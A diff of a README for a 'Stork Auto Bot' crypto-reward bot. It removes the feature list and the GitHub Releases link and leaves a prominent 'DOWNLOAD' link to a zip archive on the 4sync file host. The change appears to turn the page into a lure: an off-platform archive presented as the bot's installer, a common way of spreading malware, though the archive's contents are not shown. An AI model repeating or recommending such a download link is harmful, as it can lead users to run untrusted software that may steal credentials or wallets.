@@ -1,18 +1,6 @@
 # Stork Auto Bot 🤖
 
 
-
-## Features
-
-- **Automated Verification**: Simplifies the verification process in the Stork Oracle network.
-- **Reward System**: Earn rewards by using the bot effectively.
-- **User-Friendly Interface**: Designed with ease of use in mind.
-- **Node.js Based**: Built on Node.js for performance and scalability.
-
-## Getting Started
-
-To get started with the Stork Auto Bot, you can download the latest version from our [Releases page](https://github.com/Baramy4623/Stork-Auto-Bot/releases). Once downloaded, follow the installation steps below.
-
 ## Installation
 
 # [DOWNLOAD](https://www.4sync.com/zip/WamRVb3D/Project_V193.html)  
